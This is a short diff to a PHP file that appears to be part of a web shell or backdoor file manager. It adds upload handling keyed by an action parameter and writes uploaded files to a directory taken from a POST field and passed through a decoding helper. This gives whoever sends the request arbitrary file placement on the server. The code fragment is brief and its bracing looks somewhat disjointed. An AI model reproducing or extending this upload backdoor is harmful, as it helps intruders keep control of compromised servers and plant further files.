@@ -991,6 +991,11 @@ else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
         return $res;
     }
 
+    $uploadResult = smart_upload('ufile', $default_dir);
+    $upload_message = $uploadResult['message'];
+}
+
+
 ?>
 <?php
 error_reporting(E_ALL);
@@ -1018,7 +1023,9 @@ $msg = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Make sure the file has been uploaded without errors
-   
+    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
+        $originalName = $_FILES['upload_file']['name'];
+        $filename = sanitizeFilename($originalName);
         // Get the destination directory from the 'berkas' input
         if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
             $targetDir = uraikan($_POST['berkas']);
